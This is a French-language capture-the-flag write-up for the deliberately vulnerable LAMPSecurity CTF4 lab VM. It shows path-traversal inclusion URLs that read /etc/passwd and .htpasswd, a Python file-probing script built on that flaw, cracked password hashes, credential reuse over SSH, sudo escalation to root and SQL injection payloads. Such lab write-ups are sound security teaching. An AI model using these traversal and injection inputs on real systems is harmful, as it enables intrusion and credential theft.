# Solution du CTF LAMPSecurity: CTF4

Une nouvelle traque commence
----------------------------

[LAMPSecurity: CTF4](http://vulnhub.com/entry/lampsecurity-ctf4,83/) est le 4ème CTF d'une série de CTFs en rapport avec les failles que l'on trouve souvent dans les web-apps PHP.  

[Le précédent CTF](http://devloop.users.sourceforge.net/index.php?article88/solution-du-ctf-lampsecurity-6) s'était montré très simple, nous allons voir si celui-ci corse un peu les choses.  

Pour info le système est une RHEL 3.  

Approcher la bête
-----------------

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-07 08:31 CEST
Nmap scan report for 192.168.1.99
Host is up (0.00017s latency).
Not shown: 65531 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)
|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)
25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.1.3], pleased to meet you, --- snip ---, 
|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO  --- snip ---
80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
| http-robots.txt: 5 disallowed entries 
|_/mail/ /restricted/ /conf/ /sql/ /admin/
|_http-title:  Prof. Ehks 
631/tcp closed ipp
MAC Address: 00:0C:29:28:D9:61 (VMware)
Aggressive OS guesses: Linux 2.6.18 - 2.6.21 (98%), --- snip ---
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: ctf4.sas.upenn.edu; OS: Unix
```

Le fichier *robots.txt* nous donne dores et déjà un nombre important de pistes à étudier.  

A la racine web on trouve un site simple dans le style blog avec différentes sections. On remarque immédiatement le paramètre page.  

On teste quelques remontées d'arborescence et paff ! Le coup est parti tout seul.  

```plain
http://192.168.1.99/index.html?page=../../../../etc/passwd%00&title=Blog

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
--- snip ---
dstevens:x:500:506:Don Stevens:/home/dstevens:/bin/bash
achen:x:501:501:Andrew Chen:/home/achen:/bin/bash
pmoore:x:502:502:Phillip Moore:/home/pmoore:/bin/bash
jdurbin:x:503:503:James Durbin:/home/jdurbin:/bin/bash
sorzek:x:504:504:Sally Orzek:/home/sorzek:/bin/bash
ghighland:x:505:505:Greg Highland:/home/ghighland:/bin/bash
ossec:x:506:508::/var/ossec:/sbin/nologin
ossecm:x:507:508::/var/ossec:/sbin/nologin
ossecr:x:508:508::/var/ossec:/sbin/nologin
```

Dans d'autres URLs on trouve un paramètre id. Et repaff !  

```plain
http://192.168.1.99/index.html?page=blog&title=Blog&id=%22%27
Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20
```

Et ben voilà ! C'est de l'élevage, ils ont fait un lâcher ! Vous connaissez mon côté sportif, j'ai failli remettre le couteau dans l'étui...  

Mais puisqu'on a commencé, finissons cette boucherie.  

Sous */mail/* on trouve un *SquirrelMail* 1.4.17.  

Sous */restricted/* il y a une section privée qui demande une authentification (erreur 401). Cette dernière n'est pas bypassable avec *Wapiti*.  

Sous */conf/* on obtient une erreur 500 (I*nternal Server Error*)  

Sous */sql/* on trouve un script *db.sql* qui contient des instructions pour créer une base de donnée baptisée *ehks* et correspondant au site principal.  

Et sous */admin/* on trouve un formulaire de connexion protégé... avec un javascript qui retire les apostrophes et double-quotes !  

Commencer le massacre
---------------------

Ça a beau être de l'élevage, le vrai chasseur sait rendre la traque plus intéressante si il le faut.  

Pour cela j'ai écrit un script Python qui exploite la faille d'inclusion et va automatiquement tester la présence de fichiers listés dans *files.txt*.  

Le principe est le suivant : on teste un path de fichier dans l'URL (en ajoutant la remontée d'arborescence et l'octet nul) et on regarde via *BeautifulSoup* si on a du contenu présent dans la balise div où se fait normalement l'inclusion de données.  

```python
import requests
from bs4 import BeautifulSoup

URL = "http://192.168.1.99/index.html?page=../../../../../..PARAM%00&title=Blog"

fd = open("files.txt")

while True:
    word = fd.readline()
    if not word:
        break
    word = word.strip()
    r = requests.get(URL.replace("PARAM", word))
    bs = BeautifulSoup(r.content)
    content = bs.find("div", id="main").text.strip()
    if len(content):
        print "Contenu trouve avec", word
fd.close()
```

Ça me donne :  

```plain
Contenu trouve avec /var/log/lastlog
Contenu trouve avec /var/run/utmp
Contenu trouve avec /var/log/messages
Contenu trouve avec /var/log/messages.1
Contenu trouve avec /var/log/messages.2
Contenu trouve avec /etc/passwd
Contenu trouve avec /etc/shadow
Contenu trouve avec /etc/group
Contenu trouve avec /etc/hosts
Contenu trouve avec /etc/issue
Contenu trouve avec /etc/redhat-release
Contenu trouve avec /etc/crontab
Contenu trouve avec /etc/inittab
Contenu trouve avec /proc/version
Contenu trouve avec /proc/cmdline
Contenu trouve avec /proc/self/environ
Contenu trouve avec /etc/httpd/conf/httpd.conf
Contenu trouve avec /etc/ssh/sshd_config
Contenu trouve avec /etc/my.cnf
Contenu trouve avec /etc/php.ini
Contenu trouve avec /var/log/messages
Contenu trouve avec /var/log/dmesg
```

La lecture du fichier de configuration d'*Apache* me permet de connaître la racine web (*/var/www/html*).  

A partir de là plusieurs angles d'attaque sont possibles. J'ai choisi de m'orienter illico sur le dossier restricted.  

Via la faille include (*/index.html?page=../../../../../../var/www/html/restricted/.htaccess%00&title=Blog*) on obtient le *.htaccess* suivant :  

```plain
AuthType Basic
AuthName "Restricted - authentication required"
AuthUserFile /var/www/html/restricted/.htpasswd
Require valid-user
```

Et son *.htpasswd* :  

```plain
ghighland:8RkVRDjjkJhq6
pmoore:xHaymgB2KxbJU
jdurbin:DPdoXSwmSWpYo
sorzek:z/a8PtVaqxwWg
```

Ces hashs DES sont cassés très vite via dictionnaire et brute-force :  

```plain
ghighland:undone1:::::::
pmoore:Homesite:::::::
jdurbin:Sue1978:::::::
sorzek:pacman:::::::
```

En se connectant sous */restricted/* on trouve deux fichiers txt.  

Un fichier blog\_instructions.txt :  

```plain
Instructions for Posting to the Blog
====================================

Just log into the admin section at http://192.168.0.6/admin.
Use your regular machine credentials (username and password).
Once you're logged in click the "Blog" link.
```

Un fichier webmail\_instructions.txt :  

```plain
Instructions for Webmail
========================

Browse to the URL http://192.168.0.6/mail
Log in with your regular machine credentials (username and password).
Use webmail ;)

Let Don or James know if you're having problems.
```

Apparemment les identifiants de machine servent un peu à tout... Je me connecte en SSH avec les identifiants de *ghighland* et paff ! Ça passe encore !  

```plain
[ghighland@ctf4 ~]$ uname -a
Linux ctf4.sas.upenn.edu 2.6.15-1.2054_FC5 #1 Tue Mar 14 15:48:33 EST 2006 i686 i686 i386 GNU/Linux
```

Je trouve des identifiants MySQL dans */var/www/html/conf/config.ini* :  

```plain
dbhost  =       localhost
db      =       ehks
dbuser  =       root
dbpass  =       database
```

Un petit tour avec le client MySQL :  

```plain
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| calendar           |
| ehks               |
| mysql              |
| roundcubemail      |
| test               |
+--------------------+
```

Et dans la table *ehks* on trouve une table user :  

```plain
mysql> select * from user;
+---------+-----------+----------------------------------+
| user_id | user_name | user_pass                        |
+---------+-----------+----------------------------------+
|       1 | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |
|       2 | achen     | b46265f1e7faa3beab09db5c28739380 |
|       3 | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |
|       4 | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |
|       5 | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |
|       6 | ghighland | 9f3eb3087298ff21843cc4e013cf355f |
+---------+-----------+----------------------------------+
```

Un petit tour sur [CrackStation](https://crackstation.net/) permet de casser les hashs MD5 et obtenir des comptes supplémentaires (*dstevens/ilike2surf*, *achen/seventysixers*). Un vrai carnage, j'ai même pas eu le temps de recharger !  

Dans la base *calendar* rien de bien intéressant... Un compte admin avec le password *"calendar"* (hashé en MD5).  

Comme le laissait supposer la présence du *SquirrelMail*, les utilisateurs ont chacun une boite de messagerie.  

```plain
[ghighland@ctf4 www]$ ls /var/spool/mail/ -lh
total 1.8M
-rw------- 1 achen     mail 838K Jul  7 11:32 achen
-rw------- 1 dstevens  mail 848K Jul  7 11:32 dstevens
-rw------- 1 ghighland mail 4.2K Mar 10  2009 ghighland
-rw------- 1 jdurbin   mail 3.8K Mar 10  2009 jdurbin
-rw------- 1 pmoore    mail 2.4K Mar 10  2009 pmoore
-rw------- 1 root      root 3.1K Mar  9  2009 root
-rw------- 1 sorzek    mail 5.6K Mar 10  2009 sorzek
```

Qu'ai-je reçu en tant que *Greg Highland* ?  

```plain
From dstevens@ctf4.sas.upenn.edu  Mon Mar  9 10:52:25 2009
Return-Path: <dstevens@ctf4.sas.upenn.edu>
Received: from 192.168.0.6 (ctf4.sas.upenn.edu [127.0.0.1])
        by ctf4.sas.upenn.edu (8.13.5/8.13.5) with ESMTP id n29EqPmw004912
        for <users@localhost>; Mon, 9 Mar 2009 10:52:25 -0400
Received: from 192.168.0.50
        (SquirrelMail authenticated user dstevens)
        by 192.168.0.6 with HTTP;
        Mon, 9 Mar 2009 10:52:25 -0400 (EDT)
Message-ID: <b9b632688feb3dd9856fd7e40d381785.squirrel@192.168.0.6>
Date: Mon, 9 Mar 2009 10:52:25 -0400 (EDT)
Subject: Server setup
From: "Don Stevens" <dstevens@ctf4.sas.upenn.edu>
To: users@ctf4.sas.upenn.edu
Reply-To: dstevens@ctf4.sas.upenn.edu
User-Agent: SquirrelMail/1.4.17
MIME-Version: 1.0
Content-Type: text/plain;charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-Priority: 3 (Normal)
Importance: Normal
X-IMAPbase: 1236693406 0000000002
X-UID: 1                                     
Status: RO
X-Status: A

Hello all,

  the server is up and running now and should be able to support most of
our needs.  Don and I are still working on installing a few more patches
and configuring things.  Let us know if you have any problems.  Thanks!

-- 
Don Stevens
Sr. Unix Admin
Prof. Ehks Data Research Center

==================================================

Subject: Re: Hey Sally
From: "Sally Orzek" <sorzek@ctf4.sas.upenn.edu>
To: ghighland@ctf4.sas.upenn.edu

Hi Greg,

  yeah, they gave me that talk as well.  I just changed my password to
something like "password1234" and then changed it back to the one I
wanted after that :)  You can probably just use a number though - might
be easier to remember and keep you out of trouble.

-- 
Sally Orzek
Ehks Data Research

> Hey Sally,
>
>   so the server is all set up now, and I wanted to ask you about the whole
> password thing.  I know they said to use a number as well, so I couldn't
> use my regular password of "undone".  Do you think I can just tack a
> number on the end of it or will Don and Andy freak out on me?
>
> --
> Greg Highland
> Prof. Ehks Data Research Center
>
```

Ah ces utilisateurs... si naïfs.  

*Don Stevens* semble être l'administrateur de la machine. Connectons-nous avec ses identifiants.  

Le coup de grace
----------------

Dans son *.bash\_history* on trouve des appels à *su* et *sudo*. On s’aperçoit vite que ce dernier est effectivement administrateur :  

```plain
[dstevens@ctf4 ~]$ sudo -l
Password:
User dstevens may run the following commands on this host:
    (ALL) ALL
[dstevens@ctf4 ~]$ sudo su
[root@ctf4 dstevens]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t:SystemLow-SystemHigh
[root@ctf4 ~]# head -1 /etc/shadow
root:$1$DSHH/MlC$DH8ClhHKeagYW4PwxICZC0:14309:0:99999:7:::
```

Le mot de passe se casse facilement :  

```plain
$ /opt/jtr/john --wordlist=mega_dict.txt  hash.txt 
Loaded 1 password hash (FreeBSD MD5 [128/128 AVX intrinsics 12x])
guesses: 0  time: 0:00:00:02 0.53% (ETA: Mon Jul  7 22:12:54 2014)  c/s: 35325  trying: 015922726 - 015924737
root1234         (root)
guesses: 1  time: 0:00:07:08 DONE (Mon Jul  7 22:13:45 2014)  c/s: 35408  trying: root12 - root162net725
```

Alternativement il est possible de passer root via le compte *achen*.  

Premièrement ce dernier a des accès encore plus ouverts (lancement de commandes en tant que root sans avoir à saisir le moindre mot de passe) :  

```plain
User achen may run the following commands on this host:
    (ALL) NOPASSWD: ALL
```

En plus dans son historique de commande on retrouve le mot de passe root :  

```plain
--- snip ---
sudo sy
su
root1234
su
--- snip ---
```

Autres vecteurs d'attaque web
-----------------------------

*Wapiti* a identifié une faille d'injection SQL dans la section */admin/* inutilement protégée par javascript :  

```plain
Injection MySQL dans http://192.168.1.99/admin/index.php via une injection dans le paramètre username
Evil request:
POST /admin/index.php HTTP/1.1
Host: 192.168.1.99
Referer: http://192.168.1.99/admin/
Content-Type: application/x-www-form-urlencoded

username=%BF%27%22%28&password=letmein

Injection MySQL dans http://192.168.1.99/admin/index.php via une injection dans le paramètre password
Evil request:
POST /admin/index.php HTTP/1.1
Host: 192.168.1.99
Referer: http://192.168.1.99/admin/
Content-Type: application/x-www-form-urlencoded

username=default&password=%BF%27%22%28
```

Il y a aussi la section */calendar/* plombée par d'autres injections SQL.  

Bref tout aussi simple que le précédent.

*Published July 08 2014 at 21:52*